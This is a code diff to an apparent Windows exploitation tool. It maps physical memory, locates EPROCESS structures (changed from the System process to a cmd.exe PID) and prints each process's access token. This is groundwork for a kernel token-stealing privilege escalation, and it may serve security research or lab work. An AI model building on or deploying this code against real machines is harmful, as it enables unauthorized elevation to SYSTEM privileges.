@@ -54,7 +54,7 @@ int main(int argc, char** argv)
 	std::vector <unsigned __int64> EPROCESS_SYSTEM;
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
+	if (GetEPROCESSPhysicalBase("cmd.exe", 6220, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
@@ -63,7 +63,6 @@ int main(int argc, char** argv)
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page;
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page_offset;
 	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
-		printf("------------------------------------\nEPROCESS Base of System: %p\n", (void*)EPROCESS_SYSTEM[i]);
 		EPROCESS_SYSTEM_page.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
 		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 	}
@@ -79,11 +78,13 @@ int main(int argc, char** argv)
 		return -1;
 	}
 
-	// print Token for each EPROCESS Base
-	PVOID castedBuf = *buf;
-	castedBuf = (unsigned char*)castedBuf + EPROCESS_SYSTEM_page_offset[0];
-	castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
-	printf("This should be the token: %p\n", *(unsigned __int64*)castedBuf);
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+		// print Token for each EPROCESS Base
+		PVOID castedBuf = *buf;
+		castedBuf = (unsigned char*)castedBuf + EPROCESS_SYSTEM_page_offset[i];
+		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
+		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
+	}
 
 
 	if (UnmapPhysicalMemory(buf) == FALSE) {
